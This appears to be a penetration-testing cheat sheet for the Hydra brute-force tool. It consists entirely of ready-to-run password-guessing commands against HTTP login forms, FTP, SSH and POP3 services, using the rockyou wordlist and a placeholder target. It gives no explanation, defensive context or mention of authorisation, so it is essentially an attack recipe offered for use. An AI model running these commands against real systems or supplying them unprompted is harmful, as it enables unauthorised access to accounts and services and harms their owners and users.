hydra -l <username> -p <password> <server> <service> -s <port> -t <thread> -o <output>
-L <users> -P <passwords>

[http]  hydra -l admin -P /usr/share/wordlists/rockyou.txt target.ip -s 80 http-post-form "/login.php:username=admin&password=^PASS^:Invalid Password!"
        hydra -l phillips -P /usr/share/wordlists/rockyou.txt target.ip  http-form-get '/login-get/index.php:username=^USER^&password=^PASS^:Login failed!'
[ftp]   hydra -L username.txt -P password.txt target.ip ftp -s 21
[ssh]   hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.ip -o hydra.ssh
[pop3]  hydra -I -L usernames.txt -P passwords.txt pop3://target.ip -t 64 -o hydra.pop3



